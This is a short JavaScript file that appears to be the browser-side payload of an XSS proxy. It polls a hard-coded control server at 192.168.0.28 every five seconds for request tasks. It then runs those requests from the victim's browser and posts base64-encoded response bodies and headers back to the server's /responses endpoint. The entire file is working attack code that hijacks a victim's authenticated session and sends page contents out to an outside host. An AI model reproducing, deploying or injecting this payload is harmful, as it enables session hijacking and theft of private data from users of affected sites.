var mygg_host = 'https://192.168.0.28:443';

function makeRequest(id, method, url, head, body){
    var target_http = new XMLHttpRequest();
    target_http.onreadystatechange = function() {
    
        if (target_http.readyState == 4 && target_http.status == 200) {
            var resp_status = target_http.status;
            var resp_body = btoa(target_http.responseText);
            var resp_headers = btoa(target_http.getAllResponseHeaders());
            var mygg_http = new XMLHttpRequest();
            mygg_http.onreadystatechange = function() {
                if (mygg_http.readyState == 4 && mygg_http.status == 200) {
                    //console.log(mygg_http.responseText);
                }
            };
            mygg_http.open("POST", mygg_host + "/responses", true);
            mygg_http.setRequestHeader("Content-Type","application/json");
            var obj = `{"id": ${id.toString()}, "url": "${url}", "status": ${resp_status}, "headers": "${resp_headers}", "body": "${resp_body}"}`
            //console.log(obj)
            mygg_http.send(obj);
        }
    };

    target_http.open(method, url, true);

    for (var key in head) {
        target_http.setRequestHeader(key, head[key]) 
    }

    if (body != null) {
        target_http.send(body);
    } else {
        target_http.send();
    }
}

function poll() {
    var mygg_http = new XMLHttpRequest();
    mygg_http.onreadystatechange = function () {
        if (mygg_http.readyState == 4 && mygg_http.status == 200) {
            console.log(mygg_http.responseText)
            var tasks = JSON.parse(mygg_http.responseText);
            for (var i in tasks){
                //console.log(tasks[i]);
                makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].head, tasks[i].body);
            }
        }
  };
  mygg_http.open("GET", mygg_host + "/polling", true);
  mygg_http.send();
    
  setTimeout(poll, 5000);
}

poll();
